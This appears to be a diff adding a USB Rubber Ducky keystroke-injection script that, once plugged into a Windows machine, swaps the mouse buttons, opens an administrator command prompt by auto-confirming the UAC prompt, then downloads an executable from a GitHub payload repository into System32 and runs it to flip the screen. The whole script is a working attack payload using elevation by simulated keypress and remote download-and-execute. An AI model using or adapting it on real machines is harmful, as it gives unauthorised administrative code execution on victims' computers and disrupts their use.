@@ -1,0 +1,24 @@
+REM s`ap mouse buttons
+GUI r
+DELAY 100
+STRING main.cpl
+DELAY 10
+ENTER
+DELAY 700
+STRING 0 0
+
+REM open admin cmd
+GUI d
+DELAY 100
+GUI r
+DELAY 700
+STRING powershell Start-Process cmd -Verb runAs
+ENTER
+DELAY 1500
+ALT y
+DELAY 1000
+
+REM payload
+STRING powershell.exe Invoke-WebRequest -Uri 'https://github.com/chaos511/DuckyPayloads/raw/master/flipscreen/programs/display64.exe' -OutFile C:\Windows\System32\display64.exe;display64.exe /rotate:180
+ENTER
+
